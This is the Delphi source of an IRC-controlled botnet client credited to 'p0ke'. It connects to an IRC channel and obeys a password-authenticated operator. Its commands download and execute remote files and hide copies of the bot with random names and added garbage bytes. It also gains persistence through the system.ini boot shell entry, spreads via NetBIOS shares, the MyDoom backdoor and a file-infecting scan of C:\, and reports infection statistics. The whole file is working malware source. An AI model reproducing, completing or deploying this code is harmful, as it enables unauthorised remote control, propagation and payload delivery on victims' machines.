(* Biscan Bot: Coded by p0ke *)
{ -- http://p0ke.no-ip.com -- }

unit pbot;

interface

uses
  Windows,
  Winsock,
  uNetBios,
  uMyDoom,
  pFunc;

type
  TBisBot = Class(TObject)
    szPort      :Integer;
    szIP        :String;
    szNick      :String;
    szIdent     :String;
    szChannel   :String;
    szChannelPass:String;
    szPassword  :String;
    szDot       :String;
    LoggedIn    :Bool;
    Silent      :Bool;
    NeverStop   :Bool;

    Procedure StartBot;
    Procedure ReadSock;
  Private
    {Insert Private Shit Here}
    Sock        :TSocket;
    Addr        :TSockAddrIn;
    _Wsa        :TWSAData;
    Params      :Array[0..2000] Of String;
    Admin       :String;

    Function GetNick(Param:String):String;
    Function GetChannel(Param:String):String;
    Function GetMessage(Param:String):String;
    Procedure GetParams(Data: String);
    Procedure SendInfo;
  Public
    {Insert Public Shit Here}
    Function SendData(Text: String): Integer;
  End;

var
  Bot                   : TBisBot;
  Paths                 : string;

  netbiosstarted        : Bool;
  netbios_infected      : Integer;
  netbios_tries         : Integer;
  netbios_failed        : Integer;
  netbios_accessdenied  : Integer;
  netbios_invalidpass   : Integer;
  netbios_logonfailure  : Integer;
  netbios_spreadname    : String;
  netbios_silent        : Bool;
  netbios_sock          : TSocket;

  mydoomstarted         : Bool;
  mydoom_infected       : Integer;
  mydoom_tries          : Integer;
  mydoom_failed         : Integer;

  scanstarted           : Bool;
  scan_infectedfiles    : integer;
  scan_infecteddirs     : integer;
  scan_copied           : integer;

  Procedure scan;

implementation

Function TBisBot.SendData(Text: String): Integer;
Begin
  Result := Send(Sock, Text[1], Length(Text), 0);
End;

Procedure TBisBot.GetParams(Data: String);
Var
  Tmp: String;
  I  : Integer;
Begin
  FillChar(Params, 2000, #0);
  Data := Trim(Data) + ' ';
  I := 0;

  While Pos(' ', Data) > 0 Do
  Begin
    Tmp := Copy(Data, 1, Pos(' ', Data)-1);
    Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
    Params[i] := Tmp;
    Inc(I);
  End;
End;

Function TBisBot.GetNick(Param:String):String;
Begin
 Result := Copy(Param, 2, Pos('!', Param)-2);
End;

Function TBisBot.GetChannel(Param:String):String;
Begin
 Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
 Result := Copy(Result, 1, Pos(':', result)-2);
End;

Function TBisBot.GetMessage(Param:String):String;
Begin
 Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
 Result := Copy(Result, Pos(':', result)+1, Length(Result));
 If Copy(Result, Length(Result)-1, 1) = #10 Then
   Result := Copy(Result, 1, Length(Result)-1);
 If Copy(Result, Length(Result)-1, 1) = #13 Then
   Result := Copy(Result, 1, Length(Result)-1);
End;

Procedure scan;
Begin
  Paths := '';
  ScanFiles('C:\', '*', '*.*');
  scanstarted := false;
End;

Procedure TBisBot.ReadSock;
Var
  Data: String;
  Buf : Array[0..1600] Of Char;
  Tmp : String;

  Nick: String;
  Mess: String;
  Chan: String;

  D   : Dword;
Begin
  While Recv(Sock, Buf, 1600, 0) > 0 Do
  Begin
    Data := '';
    Data := Buf;
    ZeroMemory(@Buf, SizeOf(Buf));

    Nick := GetNick(Data);
    Mess := GetMessage(Data);
    Chan := GetChannel(Data);

    GetParams(Data);

    If Pos('PING', Data) > 0 Then
    Begin
      Tmp := Copy(Data, Pos('PING :', Data), Length(Data));
      Delete(Tmp, 2, 1);
      Insert('O', Tmp, 2);
      Tmp := Copy(Tmp, 1, Pos(#10, Tmp));
      SendData(Tmp);
    End;

    If Pos('MOTD', Data) > 0 Then
    Begin
      SendData('JOIN '+szChannel+' '+szChannelPass+#10);
      SendData('MODE '+szChannel+' '+szChannelPass+#10);
    End;

    If UpperCase(Params[1]) = 'PRIVMSG' Then
    Begin
      Delete(Params[3],1,1);

      If LowerCase(Params[3]) = szDot+'login' Then
      Begin
        If Not LoggedIn Then
        Begin
          If Params[4] = szPassword Then
          Begin
            LoggedIn := True;
            Admin := Nick;
            If Not Silent Then
              SendData('PRIVMSG '+szChannel+' :Welcome'#10);
          End;
        End;
      End;

      If (LoggedIn) and (Admin = Nick) Then
      Begin
        If LowerCase(Params[3]) = szDot+'dlfile' Then
        Begin
          // .dlfile <http> <save as> <execute/update>
          If Not Silent Then SendData('PRIVMSG '+szChannel+' :Downloading File...'#10);
          URLDownloadToFile(0, pchar(Params[4]), pchar(Params[5]), 0, 0);
          If Not Silent Then SendData('PRIVMSG '+szChannel+' :Download Successfull'#10);
          if Params[6] = '1' Then
          begin
            ExecuteFile(Params[5], true);
            If Not Silent Then SendData('PRIVMSG '+szChannel+' :File Executed'#10);
          End Else
          If Params[6] = '2' Then
          Begin
            If Not Silent Then SendData('QUIT :Updating...'#10);
            CloseSocket(Sock);
            ExecuteFile(Params[5], true);
            ExitProcess(0);
          End;
        End;

        If LowerCase(Params[3]) = szDot+'logout' Then
        Begin
          LoggedIn := False;
          Admin := '';
        End;

        If LowerCase(Params[3]) = szDot+'silent' Then
        Begin
          If Params[4] = '1' Then Silent := True Else
          If Params[4] = '0' Then Silent := False Else
          If Not Silent Then
            SendData('PRIVMSG '+szChannel+' :Invalid Input'#10);
          netbios_silent := silent;
        End;

        If LowerCase(Params[3]) = szDot+'raw' Then
        Begin
          Mess := Copy(Mess, Pos('raw ', lowercase(Mess))+4, length(mess));
          SendData(Mess+#10);
        End;

        If LowerCase(Params[3]) = szDot+'info' Then
        Begin
          If Not Silent Then
          Begin
            If Params[4] = '1' Then
            Begin
              Tmp := 'PRIVMSG '+szChannel+' :';
              Insert('(Net: '+GetNet+') - ', Tmp, Length(Tmp)+1);
              Insert('(OS: '+GetOs+') - ', Tmp, Length(Tmp)+1);
              Insert('(WinDir: '+WinDir('')+') - ', Tmp, Length(Tmp)+1);
              Insert('(CurDir: '+CurDir('')+')'#10, Tmp, Length(Tmp)+1);
              SendData(Tmp);
            End;
            If Params[4] = '2' Then
            Begin
              If lowercase(Params[5]) = 'all' Then
              Begin
                Tmp := 'PRIVMSG '+szChannel+' :';
                Tmp := Tmp + '(netbios_infected: '+inttostr(netbios_infected)+') ';
                Tmp := Tmp + '(netbios_tries: '+inttostr(netbios_tries)+') ';
                Tmp := Tmp + '(netbios_failed: '+inttostr(netbios_failed)+') ';
                Tmp := Tmp + '(netbios_accessdenied: '+inttostr(netbios_accessdenied)+') ';
                Tmp := Tmp + '(netbios_invalidpass: '+inttostr(netbios_invalidpass)+') ';
                Tmp := Tmp + '(netbios_logonfailure: '+inttostr(netbios_logonfailure)+')'#10;
              End else
              Begin
                Tmp := 'PRIVMSG '+szChannel+' :';
                Tmp := Tmp + '(netbios_infected: '+inttostr(netbios_infected)+') ';
                Tmp := Tmp + '(netbios_tries: '+inttostr(netbios_tries)+') ';
                Tmp := Tmp + '(netbios_failed: '+inttostr(netbios_failed)+')'#10;
              End;
              SendData(Tmp);
            End;
            If params[4] = '3' Then
            Begin
              Tmp := 'PRIVMSG '+szChannel+' :';
              Tmp := Tmp + '(mydoom_infected: '+inttostr(mydoom_infected)+') ';
              Tmp := Tmp + '(mydoom_tries: '+inttostr(mydoom_tries)+') ';
              Tmp := Tmp + '(mydoom_failed: '+inttostr(mydoom_failed)+')'#10;
              SendData(Tmp);
            End;
            If Params[4] = '4' Then
            Begin
              Tmp := 'PRIVMSG '+szChannel+' :';
              Tmp := Tmp + '(scan_infectedfiles: '+inttostr(scan_infectedfiles)+') ';
              Tmp := Tmp + '(scan_infecteddirs: '+inttostr(scan_infecteddirs)+') ';
              Tmp := Tmp + '(scan_copied: '+inttostr(scan_copied)+')'#10;
              SendData(Tmp);
            End;
            If Params[4] = '5' Then
            Begin
              Tmp := 'PRIVMSG '+szChannel+' :';
              if extractfilepath(paramstr(0)) = curdir('') then
                Insert('File(%cur%\'+extractfilename(ParamStr(0))+')'#10, Tmp, Length(Tmp)+1) else
              if extractfilepath(paramstr(0)) = windir('') then
                Insert('File(%win%\'+extractfilename(ParamStr(0))+')'#10, Tmp, Length(Tmp)+1) else
              if extractfilepath(paramstr(0)) = sysdir('') then
                Insert('File(%sys%\'+extractfilename(ParamStr(0))+')'#10, Tmp, Length(Tmp)+1) else
              if extractfilepath(paramstr(0)) = tmpdir('') then
                Insert('File(%tmp%\'+extractfilename(ParamStr(0))+')'#10, Tmp, Length(Tmp)+1) else
              Insert('File(\'+extractfilename(ParamStr(0))+')'#10, Tmp, Length(Tmp)+1);
              SendData(Tmp);
            End;
          End;
        End;

        If LowerCase(Params[3]) = szDot+'restart' Then
        Begin
          SendData('QUIT :Restarting'#10);
          If Params[4] <> '' Then
            Sleep(StrToInt(Params[4])*1000);
          CloseSocket(Sock);
        End;

        If LowerCase(Params[3]) = szDot+'exit' Then
        Begin
          SendData('QUIT :Quiting'#10);
          Sleep(400);
          ExitProcess(0);
        End;

        If LowerCase(Params[3]) = szDot+'rndnick' Then
        Begin
          SendData('NICK '+RandomName+#10);
        End;

        If LowerCase(Params[3]) = szDot+'join' Then
        Begin
          If Params[4][Length(Params[4])] = #10 Then
            Delete(Params[4], Length(Params[4]), 1);
          SendData('JOIN '+Params[4]+#10);
        End;

        If LowerCase(Params[3]) = szDot+'part' Then
        Begin
          If Params[4][Length(Params[4])] = #10 Then
            Delete(Params[4], Length(Params[4]), 1);
          SendData('PART '+Params[4]+' :Heh :)'#10);
        End;

        If LowerCase(Params[3]) = szDot+'hide' Then
        Begin
          If (Params[4] <> '') and (Params[4] <> '*') Then
          Begin
            Tmp := lowercase(Params[4]);
            replacestr('%rnddir%', randomdir, tmp);
            replacestr('%sys%\', sysdir(''), Tmp);
            replacestr('%win%\', windir(''), Tmp);
            replacestr('%cur%\', curdir(''), Tmp);
            replacestr('%tmp%\', tmpdir(''), Tmp);
            replacestr('%rand%', randomname, Tmp);
            If Pos('.', extractfilename(tmp)) = 0 then tmp := tmp + '.exe';
            Params[4] := Tmp;

            If CopyFile(pChar(ParamStr(0)), pChar(Params[4]), False) Then
            Begin
              If Not Silent Then
                SendData('PRIVMSG '+szChannel+' :Hidden as ('+Params[4]+')'#10);
            End Else
            Begin
              If Not Silent Then
                SendData('PRIVMSG '+szChannel+' :Failed to hide as ('+Params[4]+')'#10);
            End;
          End Else
          Begin
            tmp := '%rnddir%\%rand%.exe';
            replacestr('%rnddir%', randomdir, tmp);
            replacestr('%sys%\', sysdir(''), Tmp);
            replacestr('%win%\', windir(''), Tmp);
            replacestr('%cur%\', curdir(''), Tmp);
            replacestr('%tmp%\', tmpdir(''), Tmp);
            replacestr('%rand%', randomname, Tmp);

            If Pos('.', extractfilename(tmp)) = 0 then tmp := tmp + '.exe';
            Params[4] := Tmp;

            If CopyFile(pChar(ParamStr(0)), pChar(Params[4]), False) Then
            Begin
              If Not Silent Then
                SendData('PRIVMSG '+szChannel+' :Hidden as ('+Params[4]+')'#10);
            End Else
            Begin
              If Not Silent Then
                SendData('PRIVMSG '+szChannel+' :Failed to hide as ('+Params[4]+')'#10);
            End;
          End;

          If Params[5] <> '' then
          Begin
            If strtoint(Params[5]) > 0 then
              If RandomGarbage(Params[4], strtoint(Params[5])) Then
                If Not Silent Then
                  SendData('PRIVMSG '+szChannel+' :Added Random Garbage To ('+Params[4]+')'#10)
                Else
                  SendData('PRIVMSG '+szChannel+' :Failed To Add Random Garbage To ('+Params[4]+')'#10);
          End;

          If LowerCase(Params[6]) = '+reg' then
          Begin
            WritePrivateProfileString('boot','shell',pchar('explorer.exe '+params[4]),'system.ini');
            If Not Silent Then
              SendData('PRIVMSG '+szChannel+' :Added copy to statup'#10);
          End;

          If LowerCase(Params[7]) = '1' Then
            ExecuteFile(Params[4], true);
        End;

        If LowerCase(Params[3]) = szDot+'spread' Then
        Begin
          If Params[4] <> '' Then
            Case StrToInt(Params[4]) Of
              1: If Not NetBiosStarted Then StartNetBios(400);
              2: If Not MyDoomStarted Then  StartMyDoom(400);
              3: If Not scanstarted Then CreateThread(nil,0,@scan,nil,0,d);
            End;
        End;

      End;
    End;

  End;
End;

Procedure TBisBot.SendInfo;
Var
  Tmp: String;
Begin
  Tmp := 'USER '+LowerCase(szIdent)+' '+LowerCase(szIdent)+'@'+LowerCase(szNick)+'.com "win2k" :'+LowerCase(szNick)+#10+
         'NICK '+szNick+#10;
  SendData(Tmp);
End;

Procedure TBisBot.StartBot;
Begin
  Repeat
    WsaStartUp(makeword(2,1),_wsa);

    Sock := Socket(2, 1, 0);
    addr.sin_family := 2;
    addr.sin_port := htons(szPort);
    addr.sin_addr.S_addr := inet_addr(pchar(szip));

    if connect(sock, addr, sizeof(addr)) = error_success then
    begin
      SendInfo;
      ReadSock;
    end;

    WsaCleanUp;
  Until (Not NeverStop);
End;

end.
